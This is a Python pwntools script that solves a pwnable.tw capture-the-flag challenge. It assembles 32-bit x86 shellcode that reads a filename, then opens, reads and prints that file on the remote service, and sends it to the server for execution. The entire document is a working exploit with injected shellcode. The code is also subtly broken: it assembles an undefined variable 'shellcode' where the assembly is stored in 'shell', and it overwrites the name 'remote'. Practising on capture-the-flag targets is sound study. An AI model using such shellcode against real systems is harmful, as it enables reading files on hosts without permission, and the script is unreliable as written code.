#coding:utf-8
from pwn import *
from keystone import *
context(os='linux', arch='i386', log_level='debug')
host = 'chall.pwnable.tw'
port = 10001

remote = remote(host, port)
ks = Ks(KS_ARCH_X86, KS_MODE_32)

shell = '''
mov eax, 3
    xor ebx, ebx
    mov ecx, 0x0804a000
    mov edx, 0x10
    int 0x80

    mov eax, 5
    mov ebx, 0x804a000
    xor ecx, ecx
    xor edx, edx
    int 0x80

    mov ebx, eax
    mov eax, 3
    mov ecx, 0x804a000
    mov edx, 0x40
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, 0x804a000
    mov edx, 0x40
    int 0x80
'''
remote.recvuntil('shellcode')
input()
encoding, count = ks.asm(shellcode)
remote.send(''.join(map(chr, encoding)))
remote.interactive()
